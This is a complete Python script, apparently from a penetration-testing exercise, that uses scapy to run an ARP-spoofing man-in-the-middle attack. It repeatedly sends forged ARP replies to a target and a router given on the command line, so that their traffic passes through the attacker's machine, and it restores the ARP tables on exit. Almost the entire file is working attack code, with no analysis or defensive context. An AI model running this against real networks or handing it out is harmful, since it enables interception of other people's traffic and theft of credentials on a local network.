#!/usr/bin/env python

from time import sleep
import scapy.all as scapy
import argparse

parser = argparse.ArgumentParser()
parser.add_argument(
    "-t", "--target", required=True, help="Specify the target IP address"
)
parser.add_argument(
    "-r", "--router", required=True, help="Specify the router IP address"
)

args = parser.parse_args()

target_ip = args.target
router_ip = args.router


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_requests = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if answered_requests:
        return answered_requests[0][1].hwsrc
    else:
        print("Could not find a client with given IP address. Exiting...")
        exit()


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    scapy.send(packet, count=4, verbose=False)


try:
    sent_packets_count = 0
    print("[+] Started ARP spoofing. Press CTRL + C to quit.")
    while True:
        spoof(router_ip, target_ip)
        spoof(target_ip, router_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        sleep(2)
except KeyboardInterrupt:
    print("\n[+] CTRL + C detected. Resetting ARP tables...")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)
